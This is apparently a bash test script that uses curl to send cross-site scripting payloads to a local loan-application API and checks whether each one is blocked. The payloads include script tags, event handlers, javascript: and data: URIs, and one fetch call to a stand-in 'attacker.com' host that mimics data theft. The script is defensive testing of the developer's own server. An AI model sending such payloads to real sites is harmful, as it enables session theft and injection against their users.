#!/bin/bash

# XSS Attack Testing - cURL Command Examples
# Use these commands to manually test your API endpoints for XSS vulnerabilities
# 
# Before running:
# 1. Start your development server: pnpm dev
# 2. Update BASE_URL to match your server address
# 3. Update API_KEY if authentication is required

set -e

# Configuration
BASE_URL="http://localhost:3000"
API_ENDPOINT="/api/trpc"
OUTPUT_FILE="xss-test-results.txt"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Initialize results file
> "$OUTPUT_FILE"

echo -e "${BLUE}╔════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║          XSS ATTACK TESTING - cURL Command Suite              ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo "Starting XSS vulnerability testing..."
echo "Results will be saved to: $OUTPUT_FILE"
echo ""

# Function to test an endpoint
test_endpoint() {
    local name=$1
    local method=$2
    local endpoint=$3
    local payload=$4
    
    echo -e "${YELLOW}Testing: $name${NC}"
    echo "Method: $method" >> "$OUTPUT_FILE"
    echo "Endpoint: $endpoint" >> "$OUTPUT_FILE"
    echo "Payload: $payload" >> "$OUTPUT_FILE"
    
    if [ "$method" = "POST" ]; then
        echo -e "Request:"
        echo "curl -X POST $BASE_URL$endpoint \\"
        echo "  -H \"Content-Type: application/json\" \\"
        echo "  -d '$payload'"
        echo ""
        
        response=$(curl -s -X POST "$BASE_URL$endpoint" \
            -H "Content-Type: application/json" \
            -d "$payload")
    else
        echo -e "Request:"
        echo "curl -X GET \"$BASE_URL$endpoint?search=$(echo $payload | jq -r '.search')\""
        echo ""
        
        response=$(curl -s -X GET "$BASE_URL$endpoint" \
            -H "Content-Type: application/json" \
            -d "$payload")
    fi
    
    echo "Response:" >> "$OUTPUT_FILE"
    echo "$response" >> "$OUTPUT_FILE"
    echo "---" >> "$OUTPUT_FILE"
    
    # Check response
    if echo "$response" | grep -q "error\|VALIDATION_ERROR\|XSS_DETECTED"; then
        echo -e "${GREEN}✅ BLOCKED - API rejected the malicious input${NC}"
    else
        echo -e "${RED}⚠️  WARNING - Input was accepted, verify sanitization${NC}"
    fi
    echo ""
}

# ============================================================================
# TEST SET 1: Script Injection in fullName field
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 1: Script Injection in fullName Field${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "Basic <script> tag in fullName" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "<script>alert(\"XSS\")</script>",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

test_endpoint \
    "Uppercase SCRIPT tag in fullName" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "<SCRIPT>alert(\"XSS\")</SCRIPT>",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 2: Event Handlers in fullName field
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 2: Event Handlers in fullName Field${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "img tag with onerror event handler" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "<img src=x onerror=\"alert(\"XSS\")\">",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

test_endpoint \
    "SVG onload event handler" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "<svg onload=\"alert(\"XSS\")\"></svg>",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 3: JavaScript Protocol URIs
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 3: JavaScript Protocol URIs${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "javascript: protocol in employer field" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "John Doe",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employer": "javascript:alert(\"XSS\")",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 4: Data URIs
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 4: Data URIs${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "data:text/html URI in employer" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "John Doe",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employer": "data:text/html,<script>alert(\"XSS\")</script>",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 5: HTML Entity Encoding Bypass
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 5: HTML Entity Encoding Bypass${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "HTML entity encoded script tag" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "&lt;script&gt;alert(\"XSS\")&lt;/script&gt;",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 6: Email Field Attacks
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 6: Email Field Attacks${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "Script injection in email field" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "John Doe",
        "email": "test@example.com<script>alert(\"XSS\")</script>",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000
    }'

# ============================================================================
# TEST SET 7: Loan Purpose Field Attacks
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 7: Loan Purpose Field Attacks${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "JavaScript fetch in loanPurpose" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "John Doe",
        "email": "test@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000,
        "loanPurpose": "<script>fetch(\"http://attacker.com/steal\")</script>"
    }'

# ============================================================================
# TEST SET 8: Search Functionality Attacks
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 8: Search Functionality Attacks${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "Script tag in search query" \
    "GET" \
    "$API_ENDPOINT/loans.search" \
    '{
        "searchQuery": "<script>alert(\"XSS\")</script>"
    }'

# ============================================================================
# TEST SET 9: Authentication Attacks
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 9: Authentication Field Attacks${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "Script tag in password field" \
    "POST" \
    "$API_ENDPOINT/auth.signup" \
    '{
        "email": "test@example.com",
        "password": "<script>alert(\"XSS\")</script>",
        "passwordConfirm": "<script>alert(\"XSS\")</script>"
    }'

# ============================================================================
# TEST SET 10: Valid Input (Should Pass)
# ============================================================================
echo -e "\n${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SET 10: Valid Input (Should Pass)${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}\n"

test_endpoint \
    "Valid loan application - should succeed" \
    "POST" \
    "$API_ENDPOINT/loans.createApplication" \
    '{
        "fullName": "John Doe",
        "email": "john.doe@example.com",
        "phone": "5551234567",
        "password": "SecurePass123!",
        "dateOfBirth": "1990-01-15",
        "ssn": "123-45-6789",
        "street": "123 Main St",
        "city": "New York",
        "state": "NY",
        "zipCode": "10001",
        "employmentStatus": "employed",
        "employer": "Tech Corp",
        "monthlyIncome": 5000,
        "loanType": "installment",
        "requestedAmount": 10000,
        "loanPurpose": "Home improvement"
    }'

# ============================================================================
# Summary
# ============================================================================
echo -e "\n${BLUE}════════════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}TEST SUMMARY${NC}"
echo -e "${BLUE}════════════════════════════════════════════════════════════════════${NC}\n"

echo -e "${GREEN}✅ All tests completed!${NC}"
echo -e "\nResults saved to: ${YELLOW}$OUTPUT_FILE${NC}"
echo ""
echo "To view results:"
echo "  cat $OUTPUT_FILE"
echo ""
echo "Recommendations:"
echo "  1. Review each response to verify XSS payloads were blocked"
echo "  2. Look for error messages indicating validation failures"
echo "  3. Ensure no payloads executed any JavaScript"
echo "  4. Check that valid input (Test Set 10) was accepted"
echo ""
